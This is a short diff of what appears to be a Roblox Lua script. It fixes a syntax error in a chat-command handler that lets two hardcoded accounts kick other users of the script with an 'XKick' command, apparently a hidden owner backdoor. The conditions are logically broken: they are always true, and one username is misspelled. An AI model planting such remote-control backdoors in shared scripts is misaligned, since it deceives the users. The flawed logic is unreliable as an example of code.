@@ -91,9 +91,10 @@ local function a(plr)
     local args3 = split[4]
     local args4 = split[5]
 
-    if plr == game.Players:FindFirstChild("Ih0temyIife") or game.Players:FindFirstChild("San_fromlb") do
+    if plr == game.Players:FindFirstChild("Ih0temyIife") or game.Players:FindFirstChild("San_fromlb") then
 
       if cmd == "XKick" then
+          
         if lp.Name ~= "Ih0temyIife" or lp.Name ~= "Sans_fromlb" then
           lp:Kick("You have been kicked by Owner of the script(XK2)")
         end
